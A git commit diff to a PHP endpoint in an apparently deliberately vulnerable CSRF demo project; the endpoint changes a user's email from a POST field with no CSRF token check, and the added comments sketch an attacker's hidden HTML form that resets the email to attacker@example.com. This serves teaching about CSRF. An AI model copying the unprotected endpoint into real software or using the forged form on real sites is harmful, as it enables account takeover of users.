c7a2e250f577a9e31216d9e06f4511f87edfe189
Adrian Mark Ayiko <98018084+adrianayiko@users.noreply.github.com>
2024-03-31 14:09:57 +0300

    Update change_email.php

--- CSRF_Vulunability/change_email.php
+++ CSRF_Vulunability/change_email.php
@@ -8,4 +8,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $email = $_POST['email'];
     updateEmail($email);
 }
+
+// Hypothetical scenario to illustrate CSRF vulnerability:
+// An attacker could craft a malicious website with the following HTML form:
+// <form action="http://yourwebsite.com/change_email.php" method="post">
+//     <input type="hidden" name="email" value="attacker@example.com">
+//     <input type="submit" value="Change Email">
+// </form>
+// If a user visits this malicious website, their browser would automatically submit the form,
+// changing their email address to "attacker@example.com" without their consent.
 ?>
